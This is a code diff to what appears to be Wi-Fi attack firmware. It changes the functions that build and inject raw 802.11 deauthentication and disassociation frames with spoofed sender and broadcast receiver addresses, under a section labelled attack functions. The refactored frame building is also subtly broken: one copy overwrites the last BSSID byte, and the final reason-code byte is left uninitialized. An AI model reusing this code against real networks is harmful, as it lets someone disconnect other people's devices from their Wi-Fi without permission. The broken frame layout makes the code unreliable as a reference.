@@ -6,8 +6,10 @@
 
 #pragma once
 
+#include <cassert>
+
 // ========== DEAUTH PACKET ========== //
-uint8_t deauth_pkt[] = {
+const uint8_t deauth_pkt[26] = {
     /*  0 - 1  */ 0xC0, 0x00,                         // Type, subtype: c0 => deauth, a0 => disassociate
     /*  2 - 3  */ 0x00, 0x00,                         // Duration (handled by the SDK)
     /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
@@ -35,19 +37,33 @@ deauth_attack_data_t deauth_data;
 
 // ========== SEND FUNCTIONS ========== //
 bool send_deauth(uint8_t ch, const uint8_t* sender, const uint8_t* receiver) {
-    deauth_pkt[0] = 0xc0;
-    memcpy(&deauth_pkt[10], sender, 6);
-    memcpy(&deauth_pkt[16], sender, 6);
-    memcpy(&deauth_pkt[4], receiver, 6);
-    return sysh::send(ch, deauth_pkt, sizeof(deauth_pkt));
+    if (!sender || !receiver) return false;
+
+    uint8_t pkt[26];
+
+    pkt[0] = 0xc0;
+    memcpy(&pkt[1], &deauth_pkt[1], 3);
+    memcpy(&pkt[4], receiver, 6);
+    memcpy(&pkt[10], sender, 6);
+    memcpy(&pkt[16], sender, 6);
+    memcpy(&pkt[21], &deauth_pkt[21], 4);
+
+    return sysh::send(ch, pkt, 26);
 }
 
 bool send_disassoc(uint8_t ch, const uint8_t* sender, const uint8_t* receiver) {
-    deauth_pkt[0] = 0xa0;
-    memcpy(&deauth_pkt[10], sender, 6);
-    memcpy(&deauth_pkt[16], sender, 6);
-    memcpy(&deauth_pkt[4], receiver, 6);
-    return sysh::send(ch, deauth_pkt, sizeof(deauth_pkt));
+    if (!sender || !receiver) return false;
+
+    uint8_t pkt[26];
+
+    pkt[0] = 0xa0;
+    memcpy(&pkt[1], &deauth_pkt[1], 3);
+    memcpy(&pkt[4], receiver, 6);
+    memcpy(&pkt[10], sender, 6);
+    memcpy(&pkt[16], sender, 6);
+    memcpy(&pkt[21], &deauth_pkt[21], 4);
+
+    return sysh::send(ch, pkt, 26);
 }
 
 // ========== ATTACK FUNCTIONS ========== //
